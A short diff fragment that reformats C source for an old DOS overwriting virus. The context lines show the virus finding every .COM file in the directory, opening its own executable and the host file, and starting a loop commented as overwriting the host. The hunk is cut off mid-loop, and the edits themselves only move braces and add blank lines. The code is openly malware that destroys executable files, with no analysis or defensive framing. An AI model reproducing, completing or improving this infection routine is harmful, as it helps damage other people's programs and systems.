@@ -7,15 +7,15 @@ int x, y, done;
 char buff[256];
 struct ffblk ffblk;
 
-main()
-{
+main () {
     done = findfirst("*.COM", &ffblk, 0); /* Find a .COM file */
 
-    while (!done) /* Loop for all COM's in DIR*/
-    { 
+    while (!done) { 
         printf("Infecting %s/n", ffblk.ff_name);   /* Inform user */
+        
         Virus = fopen(_argv[0],"rb");              /* Open infected file */ 
         Host = fopen(ffblk.ff_name,"rb+");         /* Open new host file */
+        
         x = 9504;
 
         while ( x>256 )                         /* OVERWRITE new Host */
